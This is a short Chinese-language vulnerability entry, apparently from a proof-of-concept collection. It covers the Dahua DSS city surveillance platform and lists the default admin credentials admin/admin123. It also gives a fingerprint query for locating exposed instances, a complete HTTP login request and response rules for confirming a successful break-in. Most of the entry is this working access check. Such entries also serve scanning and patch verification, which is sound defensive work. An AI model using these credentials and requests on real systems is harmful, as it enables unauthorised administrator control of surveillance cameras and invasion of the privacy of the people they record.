﻿# 大华DSS城市安防监控平台弱口令漏洞

> 更新时间：2024-04-29

> 漏洞编号：

> 漏洞说明：大华DSS城市安防监控平台是一个在通用安防视频监控系统基础上设计开发的系统。该平台/config/user_toLoginPage.action配置系统后台存在弱口令漏洞，攻击者可以通过此漏洞获取管理员对应权限。
弱口令：admin/admin123

> 漏洞特征：app="dahua-DSS"

> 验证脚本：HTTP

```
POST /config/user_login.action?nowTime=1714373664321 HTTP/1.1
Accept: text/plain, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: JSESSIONID=C5723636787E1ACB687D6206ECCD071F

userBean.loginName=admin&userBean.loginPass=dc0134141ec9319b6b4a00a75fc6a6f5
```

> 响应代码特征：200

> 响应内容特征：^(?!.*?用户名或密码错误).*?$

> 上传文件定位：

> 验证文件来源：大华DSS城市安防监控平台弱口令漏洞.poc

